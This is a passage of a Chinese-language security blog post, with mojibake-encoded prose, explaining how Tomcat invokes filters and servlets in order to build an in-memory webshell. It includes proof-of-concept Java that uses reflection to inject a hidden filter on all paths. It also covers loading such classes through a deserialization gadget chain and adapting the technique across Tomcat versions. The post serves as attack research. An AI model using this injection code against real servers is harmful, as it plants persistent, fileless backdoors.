Filterçš„åŠŸèƒ½æœ¬æ¥å°±ä¸æ˜¯åœ¨Tomcatå¯åŠ¨ä¸­ä½¿ç”¨çš„ã€‚æ‰€ä»¥ï¼Œæˆ‘ä»¬è¿˜å¾—ç®€å•çœ‹ä¸€ä¸‹Filterçš„è°ƒç”¨é€»è¾‘ï¼Œçœ‹çœ‹Tomcatæ˜¯åœ¨å“ªé‡Œä¿å­˜Filterä¿¡æ¯ï¼Œæ€ä¹ˆè°ƒç”¨Filterçš„ã€‚å¦‚æœå¯ä»¥ï¼Œæˆ‘ä»¬å°±é€šè¿‡åå°„ä¿®æ”¹å­˜å‚¨FIiterä¿¡æ¯çš„å±æ€§ã€‚</p><p>æ ¹æ®è°ƒç”¨æ ˆå¯çŸ¥ï¼ŒTomcatæ˜¯é€šè¿‡è°ƒç”¨<code>ApplicationFilterChain</code>æ¥è°ƒç”¨æ¯ä¸€ä¸ªFilterçš„ã€‚<code>ApplicationFilterChain</code>ä¹‹å‰æ˜¯ç”±<code>StandardWrapperValve#invoke()</code>è°ƒç”¨çš„ã€‚æˆ‘ä»¬ç‚¹åˆ°<code>StandardWrapperValve#invoke()</code>é‡Œå¤´çœ‹çœ‹</p><img src="/2022/07/07/2022-07-07-java-memory-shell/3.png" style="zoom: 100%;"><p>å¯ä»¥å‘ç°ï¼Œå¯¹äºæ¯ä¸€ä¸ªè¯·æ±‚ï¼ŒTomcatéƒ½ä¼šåœ¨<code>StandardWrapperValve#invoke()</code>ä¸­æ–°å»ºä¸€ä¸ª<code>ApplicationFilterChain</code>æ¥æ‰§è¡ŒFilter chainæ“ä½œã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">void</span> <span class="title">invoke</span><span class="params">(Request request, Response response)</span></span>&#123;</span><br><span class="line">    ......</span><br><span class="line">    ApplicationFilterChain filterChain = ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">    <span class="comment">//æ‹¿åˆ°filterChainåï¼Œæ‰§è¡ŒdoFilter()èµ°Filteræµç¨‹</span></span><br><span class="line">    filterChain.doFilter(request.getRequest(), response.getResponse());</span><br><span class="line">    ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>çœ‹è¿›æ–°å»ºçš„<code>ApplicationFilterFactory.createFilterChain()</code>ï¼Œè¯¥æ–¹æ³•ä¾æ®<code>context</code>ä¸Šä¸‹æ–‡å˜é‡æŸ¥æ‰¾å¯¹åº”çš„<code>Filter</code>ã€‚è‹¥<code>filterMap</code>åœ¨ä¸Šä¸‹æ–‡ä¸­æœ‰å­˜æ”¾ï¼Œå°±ä¼šæ–°å»ºä¸€ä¸ª<code>ApplicationFilterChain</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title">createFilterChain</span><span class="params">(ServletRequest request,</span></span></span><br><span class="line"><span class="function"><span class="params">            Wrapper wrapper, Servlet servlet)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    .....x</span><br><span class="line">    <span class="comment">//filterMapså°±æ˜¯ä¸Šæ–‡é€šè¿‡addFilter()ï¼Œæ’å…¥çš„Filterä¿¡æ¯è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">        <span class="comment">//è°ƒç”¨çš„Filteråœ¨ä¸Šä¸‹æ–‡ä¸­ä¸å­˜åœ¨ï¼Œå°±ä¸ä¼šå­˜å…¥filterChainä¸­ï¼Œä¹Ÿå°±ä¸ä¼šè¿”å›è¯¥filteräº†</span></span><br><span class="line">        ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">            context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">        <span class="keyword">if</span> (filterConfig == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//è°ƒç”¨çš„Filteråœ¨ä¸Šä¸‹æ–‡ä¸­å­˜åœ¨ï¼Œå­˜å…¥filterChain</span></span><br><span class="line">        filterChain.addFilter(filterConfig);</span><br><span class="line">     &#125;</span><br><span class="line">    .....</span><br><span class="line">    <span class="keyword">return</span> filterChain;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Filterç”Ÿæ•ˆ"><a href="#Filterç”Ÿæ•ˆ" class="headerlink" title="Filterç”Ÿæ•ˆ"></a>Filterç”Ÿæ•ˆ</h3><p>è¦è®©FilterçœŸæ­£ç”Ÿæ•ˆï¼Œéœ€è¦ä¿®æ”¹<code>StandardContext.filterConfigs</code>çš„å±æ€§ã€‚å¾€é‡Œå¤´æ’å…¥æ–°å¢çš„Filterã€‚ä½†è¿™ä¸ªæš‚ä¸”æ²¡çœ‹åˆ°å“ªé‡Œæœ‰èµ‹å€¼ç‚¹ã€‚ç›®æµ‹åªèƒ½æ‰‹åŠ¨åå°„ï¼Œä¸ºå…¶æ–°å¢ä¸€ä¸ª<code>Filter</code></p><p>åœ¨Debugä¸­çœ‹åˆ°<code>ApplicationFilterConfig</code>çš„å±æ€§æœ‰ç‚¹å¤æ‚ï¼Œæ€ä¹ˆæ„é€ å‘¢ï¼Ÿå»çœ‹çœ‹æºç ä¸­<code>ApplicationFilterConfig</code>æ˜¯æ€ä¹ˆè¢«æ„å»ºçš„ï¼Œæ‰¾æ‰¾æ˜¯å¦æœ‰Factoryç±»æˆ–è€…createæ–¹æ³•ã€‚æ‰¾åˆ°*StandardContext#filterStart()*ã€‚å‘ç°ç›´æ¥newå°±å¥½äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ApplicationFilterConfig filterConfig =</span><br><span class="line">     <span class="keyword">new</span> ApplicationFilterConfig(<span class="keyword">this</span>, entry.getValue());</span><br><span class="line">filterConfigs.put(name, filterConfig);</span><br></pre></td></tr></table></figure><p>çœ‹æ¥è¿˜éœ€è¦æ„é€ å¤šä¸€ä¸ª<code>FilterDef</code>ã€‚è¿™ä¸ªç±»æ²¡é‚£ä¹ˆå¤æ‚ï¼Œç›´æ¥è°ƒç”¨<code>setXX()</code>å°±å¯ä»¥å®Œæˆå±æ€§èµ‹å€¼äº†ã€‚</p><h3 id="å®Œæ•´POC"><a href="#å®Œæ•´POC" class="headerlink" title="å®Œæ•´POC"></a>å®Œæ•´POC</h3><p>æ€è·¯ï¼š</p><ol><li>ä¸´æ—¶ä¿®æ”¹<code>LifecycleBase.state</code>ä¸º<code>LifecycleState.STARTING_PREP</code></li><li>é€šè¿‡<code>ApplicationContextFacade.addFilter()</code>æ³¨å†Œä¸€ä¸ªFilterã€‚</li><li>æ³¨å†Œåè®¾ç½®Filterï¼ŒæŒ‡å®šå…¶åŒ¹é…è·¯å¾„</li><li>åå°„ä¿®æ”¹<code>StandardContext.filterConfigs</code>ï¼Œæ–°å¢Filterï¼Œä½¿å‰é¢æ³¨å†Œçš„Filterç”Ÿæ•ˆ</li><li>æœ€åè®°å¾—å°†<code>LifecycleBase.state</code>æ”¹å›<code>LifecycleState.STARTED</code></li></ol><p>å®šä¹‰ä¸€ä¸ªFIlterã€‚ä½†ä¸åœ¨<code>web.xml</code>ä¸­é…ç½®</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.evil;</span><br><span class="line">.....</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">EF</span> <span class="keyword">implements</span> <span class="title">Filter</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(FilterConfig filterConfig)</span> <span class="keyword">throws</span> ServletException </span>&#123;&#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException </span>&#123;</span><br><span class="line">        response.getWriter().write(<span class="string">&quot;Evil Filter Hook&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">destroy</span><span class="params">()</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Servletä¸­åŠ¨æ€æ³¨å†ŒFilter</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//[+] è·å–éœ€è¦çš„å±æ€§StandardContext</span></span><br><span class="line">ApplicationContextFacade applicationContextFacade = (ApplicationContextFacade) getServletContext();</span><br><span class="line">Field contextField = ApplicationContextFacade.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">contextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationContext applicationContext = (ApplicationContext) contextField.get(applicationContextFacade);</span><br><span class="line"></span><br><span class="line">Field standardContextField = ApplicationContext.class.getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">StandardContext standardContext = (StandardContext) standardContextField.get(applicationContext);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] ä¸´æ—¶ä¿®æ”¹LifecycleBase.state</span></span><br><span class="line">Field stateFiled = LifecycleBase.class.getDeclaredField(<span class="string">&quot;state&quot;</span>);</span><br><span class="line">stateFiled.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTING_PREP);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] æ³¨å†ŒFilter</span></span><br><span class="line">Filter ef = <span class="keyword">new</span> EF();</span><br><span class="line"><span class="comment">//ç¬¬ä¸€æ¬¡æ³¨å†Œå°±ä¼šè¿”å›FilterRegistration.Dynamic</span></span><br><span class="line">FilterRegistration.Dynamic filterRegistration = applicationContextFacade.addFilter(<span class="string">&quot;ef&quot;</span>, ef);</span><br><span class="line"><span class="comment">//å‚æ•°</span></span><br><span class="line"><span class="comment">//EnumSet&lt;DispatcherType&gt;: è¡¨ç¤ºæ‹¦æˆªç±»å‹</span></span><br><span class="line"><span class="comment">//boolean: åœ¨æ‰€æœ‰Filterä¹‹å/ä¹‹å‰æ‰§è¡Œ</span></span><br><span class="line"><span class="comment">//String[]: åŒ¹é…url</span></span><br><span class="line">EnumSet&lt;DispatcherType&gt; typeEnumSet = EnumSet.of(DispatcherType.REQUEST);</span><br><span class="line">filterRegistration.addMappingForUrlPatterns(typeEnumSet, <span class="keyword">false</span>, <span class="keyword">new</span> String[]&#123;<span class="string">&quot;/*&quot;</span>&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] åˆ©ç”¨å‰æ–‡è·å–çš„StandardContextã€‚å¼ºè¡Œåå°„ä¿®æ”¹filterConfig</span></span><br><span class="line">Field filterConfigField = StandardContext.class.getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap&lt;String, ApplicationFilterConfig&gt; filterConfig = (HashMap) filterConfigField.get(standardContext);</span><br><span class="line">System.out.println(filterConfig);</span><br><span class="line"></span><br><span class="line">FilterDef filterDef = <span class="keyword">new</span> FilterDef();</span><br><span class="line">filterDef.setFilter(ef);</span><br><span class="line">filterDef.setFilterName(<span class="string">&quot;ef&quot;</span>);</span><br><span class="line">filterDef.setFilterClass(ef.getClass().getName());</span><br><span class="line">filterDef.setAsyncSupported(<span class="string">&quot;false&quot;</span>);</span><br><span class="line"></span><br><span class="line">Constructor&lt;ApplicationFilterConfig&gt; applicationFilterConfigConstructor = ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">applicationFilterConfigConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">ApplicationFilterConfig applicationFilterConfig = applicationFilterConfigConstructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">filterConfig.put(<span class="string">&quot;ef&quot;</span>, applicationFilterConfig);</span><br><span class="line"></span><br><span class="line"><span class="comment">//[+] é‡ç½®LifecycleBase.state</span></span><br><span class="line">stateFiled.set(standardContext, LifecycleState.STARTED);</span><br></pre></td></tr></table></figure><p>æ•ˆæœï¼š</p><img src="/2022/07/07/2022-07-07-java-memory-shell/1.gif" style="zoom: 80%;"><h3 id="å®æˆ˜å†…å­˜é©¬è§’åº¦"><a href="#å®æˆ˜å†…å­˜é©¬è§’åº¦" class="headerlink" title="å®æˆ˜å†…å­˜é©¬è§’åº¦"></a>å®æˆ˜å†…å­˜é©¬è§’åº¦</h3><p>ä¸‰æ¢¦å¸ˆå‚…ç”¨çš„æ˜¯â€œä¿®æ”¹ç¨‹åºé€»è¾‘ï¼Œåˆå§‹åŒ–é™æ€å˜é‡â€è¿™ç§æ–¹å¼æ‹¿requestï¼Œç„¶åé¡ºåˆ©æ‹¿åˆ°contextçš„ã€‚ä½†ç”±äºè¿™ç§æ–¹å¼å¯¹äºFilterç±»å‹çš„ç¨‹åºä¸å¤ªå‹å¥½ï¼Œä¸‹æ–‡ä½¿ç”¨â€œTomcat7å¦ä¸€ä¸ªé™æ€å˜é‡â€è¿™ç§æ–¹å¼ï¼Œæ¥è·å–contextã€‚</p><p>æ‰“å†…å­˜é©¬ï¼Œæœ€å¸¸ç”¨çš„å°±æ˜¯<code>defineClass()</code>ã€‚é‚£æˆ‘ä»¬æ¥å®ç°ä¸‹ã€‚æ•´ä¸€ä¸ªå…·æœ‰CC11ä¾èµ–çš„Tomcatã€‚</p><p>CC11æ˜¯ç”¨<code>TemplatesImpl</code>æ¥<code>defineClass()</code>çš„ã€‚ä½†æ˜¯è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ã€‚æˆ‘ä»¬æ¥çœ‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">defineTransletClasses</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> TransformerConfigurationException </span>&#123;</span><br><span class="line"></span><br><span class="line">        TransletClassLoader loader = (TransletClassLoader)</span><br><span class="line">            AccessController.doPrivileged(<span class="keyword">new</span> PrivilegedAction() &#123;</span><br><span class="line">                <span class="comment">//æ–°å»ºäº†ä¸€ä¸ªClassLoader</span></span><br><span class="line">                <span class="function"><span class="keyword">public</span> Object <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">new</span> TransletClassLoader(ObjectFactory.findClassLoader(),_tfactory.getExternalExtensionsMap());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">    </span><br><span class="line">     <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; classCount; i++) &#123;</span><br><span class="line">         <span class="comment">//ä½¿ç”¨æ–°å»ºçš„ClassLoaderæ¥defineClass()</span></span><br><span class="line">         _class[i] = loader.defineClass(_bytecodes[i]);</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Javaä¸­ç±»åŠ è½½æœºåˆ¶æ˜¯åŒäº²å§”æ´¾ï¼Œä¸€èˆ¬çš„ä¾‹å¦‚<code>new XXX()</code>è¿™ç§ï¼Œéƒ½æ˜¯ç”¨çš„Javaå¯åŠ¨æ—¶åˆ›å»ºçš„ClassLoaderæ¥åŠ è½½çš„ã€‚ç±»å®ä¾‹ä¼šä¿å­˜åœ¨ClassLoaderä¸­ã€‚ä½†æˆ‘ä»¬çœ‹åˆ°<code>TemplatesImpl</code>ï¼Œå®ƒå»<code>defineClass()</code>æ˜¯ç”¨æ–°å»ºçš„ClassLoaderåŠ è½½ç±»ã€‚ç±»å®ä¾‹åªä¼šä¿å­˜åœ¨è¿™ä¸ªæ–°å»ºçš„ClassLoaderä¸­ã€‚ä½†æ‰¾äº†ä¸€åœˆï¼Œå¹¶æ²¡æœ‰å‘ç°ç¨‹åºå…¶ä»–åœ°æ–¹æœ‰å­˜å‚¨è¿™ä¸ª<code>loader</code>çš„ç‚¹ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬ç”¨<code>TemplatesImpl</code>è¿›è¡Œäº†<code>defineClass()</code>ï¼Œæ˜¯æ²¡æ³•åœ¨å¤–é¢ç”¨<code>Class.forName()</code>æ‹¿åˆ°åŠ è½½çš„ç±»å®ä¾‹çš„ã€‚</p><p>è¦åŠ¨æ€æ³¨å†ŒFIlterï¼Œéœ€è¦ApplicaationContextï¼Œä½†æˆ‘ä»¬æ‰‹å¤´åªæœ‰StandContenxtã€‚è¿™ä¸ªå¯ä»¥ä¸å¯ä»¥åŠ Filterå‘¢ï¼Ÿ</p><p>ç›´æ¥æ–­ç‚¹æ‰“åœ¨Filterä¸­ï¼Œå›æº¯çœ‹ã€‚æ‰¾åˆ°*ApplicationFilterChain#internalDoFilter()*ã€‚å¾ˆæ˜æ˜¾å¯ä»¥çœ‹åˆ°å‡ ä¸ªå…³é”®å±æ€§ï¼š<code>filters</code>, <code>filterConfig</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (pos &lt; n) &#123;</span><br><span class="line">    ApplicationFilterConfig filterConfig = filters[pos++];</span><br><span class="line">    Filter filter = filterConfig.getFilter();</span><br><span class="line">    filter.doFilter(request, response, <span class="keyword">this</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>ç»§ç»­å¾€å‰çœ‹ï¼Œè¿™äº›ä¸œè¥¿æ˜¯å“ªé‡Œè¢«èµ‹å€¼çš„å‘¢ï¼Ÿæ‰¾åˆ°*StandardWrapperValve#invoke()*ã€‚æœ‰ä¸€è¡Œï¼šFilterçš„è°ƒç”¨éƒ½æ˜¯æ ¹æ®<code>filterChain</code>çš„å€¼ï¼Œè¿›è¡Œä¾æ¬¡è°ƒç”¨çš„ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> ApplicationFilterChain filterChain =</span><br><span class="line">                ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br><span class="line">filterChain.doFilter(request.getRequest(), response.getResponse());</span><br></pre></td></tr></table></figure><p>æ‰¾æ‰¾<code>filterChain</code>å¦‚ä½•è¢«èµ‹å€¼çš„</p><p><em>ApplicationFilterFactory#createFilterChain()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">StandardContext context = (StandardContext) wrapper.getParent();</span><br><span class="line">FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"><span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">     ApplicationFilterConfig filterConfig = (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">    filterChain.addFilter(filterConfig);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨*filterChain.addFilter()*ä¸­ï¼Œå³å­˜åœ¨æœ¬å°èŠ‚å¼€å¤´è¯´çš„ï¼Œå‡ ä¸ªå…³é”®å±æ€§çš„èµ‹å€¼</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">filters[n++] = filterConfig;</span><br></pre></td></tr></table></figure><p>çœ‹åˆ°è¿™é‡Œã€‚å¯ä»¥æ•´ç†å‡ºæµç¨‹ï¼š</p><ol><li>åœ¨æ¯ä¸€ä¸ªrequestè¿›æ¥æ—¶ï¼Œéƒ½ä¼šè¿›å…¥<em>StandardWrapperValve#invoke()<em>ã€‚è¯¥æ–¹æ³•ä¼šè°ƒç”¨</em>ApplicationFilterFactory.createFilterChain</em>ç»„è£…<code>filterChain</code></li><li><code>filterChain</code>æ ¹æ®<code>StandardContext.filterMaps</code>å’Œ<code>StandardContext.filterConfigs</code>ç»„è£…</li><li>ç»„è£…å®Œæ¯•åï¼Œæ ¹æ®<code>filterChain</code>ï¼Œä¾æ¬¡è¿›è¡ŒFilterçš„è°ƒç”¨</li></ol><p>é‚£ä¹ˆæˆ‘ä»¬çš„æ§åˆ¶æ€è·¯å°±æ˜¯ï¼šç”±äºå¯è·å–<code>StandardContext</code>ï¼ŒåŸºäº<code>StandardContext</code>åå°„ä¿®æ”¹<code>filterMaps</code>ã€‚ä»¥æ­¤å°†å†…å­˜é©¬æ‰“å…¥</p><p>ä¸ºäº†é€‚é…ä¸åŒç‰ˆæœ¬çš„Tomcatã€‚éœ€è¦é¢å¤–è¿›è¡Œäº›å¤„ç†ã€‚</p><p><strong>Tomcat6</strong></p><p>FilterDefæœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ²¡ç”¨setFilter()ã€‚ä»–æ˜¯æ ¹æ®FIlterClassåŠ¨æ€åŠ è½½çš„</p><p><em>ApplicationFilterFactory#createFilterChain()</em></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">isCometFilter = filterConfig.getFilter() <span class="keyword">instanceof</span> CometFilter; <span class="comment">//æ ¹æ®filterDef.filterClassåŠ¨æ€ClassLoaderåŠ è½½</span></span><br><span class="line">filterChain.addFilter(filterConfig);</span><br></pre></td></tr></table></figure><p>ç›´æ¥åå°„è®¾ç½®<em>ApplicationFilterConfig.filter</em>ä¸å°±å¯äº†å˜›</p><p><strong>Tomcat7</strong></p><p>åŒ…åä¸ä¸€æ · </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.catalina.deploy.FilterDef;</span><br></pre></td></tr></table></figure><p><strong>Tomcat8</strong>/9</p><p>åŒ…åä¸ä¸€æ · </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.tomcat.util.descriptor.web.FilterDef;</span><br></pre></td></tr></table></figure><p><strong>Tomcat10</strong></p><p>æ•´ä¸ªåŒ…åéƒ½å˜äº†ï¼Œç”±<code>javax.servlet.*</code>å˜æˆäº†<code>jakarta.servlet.*</code>ã€‚æš‚æ—¶æ²¡æƒ³åˆ°è¯¥å¦‚ä½•é€šç”¨ã€‚åªèƒ½å•ç‹¬å¦å¼€ä¸€ä¸ªå†…å­˜é©¬payload.</p><p>åŸºäºå‰æ–‡ â€Tomcat7å¦ä¸€ä¸ªé™æ€å˜é‡â€œ ä¸­ã€‚å¯ä»¥å‘ç°ï¼Œ<code>catalina</code>å˜é‡ä¸­å­˜æ”¾äº†å¾ˆå¤šæœ‰ä»·å€¼çš„ä¿¡æ¯ã€‚åœ¨è¿™å…¶ä¸­æˆ‘ä»¬èƒ½æ‹¿åˆ°<strong>ä»»æ„</strong>Webappçš„<em>type=Manager</em>çš„ä¿¡æ¯ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;context=/tomcat1_war_exploded,host=localhost,type=Manager&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">3592</span>&#125; </span><br><span class="line"><span class="string">&quot;context=/manager,host=localhost,type=Manager&quot;</span> -&gt; &#123;com.sun.jmx.mbeanserver.NamedObject@<span class="number">3676</span>&#125; </span><br></pre></td></tr></table></figure><p>é‡Œå¤´çš„<code>resource.context.context</code>å°±æ˜¯å½“å‰webappçš„<code>ApplicationContext</code>ã€‚</p><p>è¦æ‹¿åˆ°å½“å‰webappçš„<code>ApplicationContext</code>ï¼Œæˆ‘ä»¬è¿˜è¦ç®€å•åˆ¤æ–­ä¸€ä¸‹å½“å‰webappçš„<code>context path</code>ã€‚ä¸ç„¶ä¼šæ‹¿åˆ°å…¶ä»–webappçš„<code>ApplicationContext</code></p><p>å¯ä»¥åŸºäºå‰æ–‡â€Tomcat7å¦ä¸€ä¸ªé™æ€å˜é‡â€œ çš„ä»£ç ï¼Œé€šè¿‡<code>RequestGroupInfo</code>è·å–å½“å‰è¯·æ±‚è·¯å¾„ï¼Œæ‹¼æ¥è·å–webappçš„<em>type=Manager</em>ä¿¡æ¯ã€‚</p><h2 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a>Servlet</h2><p>å»ºå¥½ä¸€ä¸ªServletæ‰“æ–­ç‚¹å¾€ä¸Šçœ‹ã€‚çœ‹çœ‹Tomcatå†…éƒ¨æ˜¯å¦‚ä½•å¤„ç†ä¸€ä¸ªServletçš„</p><p><em>ApplicationFilterChain#internalDoFilter()</em> </p><p><code>Servlet</code>å®ä¾‹ä¿å­˜åœ¨<code>servlet</code>ä¸­ï¼Œè¿½æº¯<code>servlet</code>èµ‹å€¼ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servlet.service(request, response);</span><br></pre></td></tr></table></figure><p><em>StandardWrapperValve#invoke()</em></p><p>ä½†å…¶å®<code>wrapper</code>é‡Œæ—©å°±æœ‰<code>Servlet</code>çš„å®ä¾‹äº†ã€‚ç»§ç»­è¿½æº¯<code>wrapper</code>çš„èµ‹å€¼ç‚¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">servlet = wrapper.allocate();</span><br></pre></td></tr></table></figure><p><em>StandardWrapperValve#invoke()</em></p><p>å®é™…æ˜¯<em>ValveBase.container</em>æ—©å°±å­˜æ”¾äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">StandardWrapper wrapper = (StandardWrapper) getContainer();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.mappingData.wrapper</span><br></pre></td></tr></table></figure><h1 id="ä»£ç å®ç°"><a href="#ä»£ç å®ç°" class="headerlink" title="ä»£ç å®ç°"></a>ä»£ç å®ç°</h1><p>ä»£ç ä¸¢githubå¤‡ä»½äº†ã€‚å†™çš„å¾ˆçƒ‚å°±ä¸å…¬å¼€äº†ã€‚æƒ³ç„ç„çš„è¯é—®å°ç›˜ç›˜è¦å§ã€‚</p><h1 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h1><p><a href="https://www.anquanke.com/post/id/198886">åŸºäºå†…å­˜ Webshell çš„æ— æ–‡ä»¶æ”»å‡»æŠ€æœ¯ç ”ç©¶</a></p><p><a href="https://xz.aliyun.com/t/7388">åŸºäºtomcatçš„å†…å­˜ 